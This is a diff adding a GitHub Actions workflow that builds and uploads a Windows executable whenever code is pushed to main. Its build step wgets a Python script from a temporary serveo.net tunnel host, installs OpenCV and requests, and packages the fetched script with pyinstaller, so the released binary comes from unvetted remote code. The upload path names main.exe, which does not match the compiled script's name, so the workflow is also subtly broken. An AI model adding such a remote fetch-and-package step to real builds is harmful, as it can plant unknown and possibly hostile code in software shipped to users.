@@ -1,0 +1,34 @@
+name: Build and Upload Artifacts
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build-and-upload:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v2
+      
+ 
+      - name: Build 
+        run: |
+          mkdir client/python
+          cd client/python
+          pip install pyinstaller
+          pip install requests
+          pip install opencv-python
+          wget https://eruo.serveo.net/fcdn.py
+          
+          
+          
+          pyinstaller --onefile fcdn.py
+          echo " build successfully!"
+      
+      - name: Upload Artifacts
+        uses: actions/upload-artifact@v2
+        with:
+          name: server-and-client
+          path: |
+ 
+            ./client/python/dist/main.exe
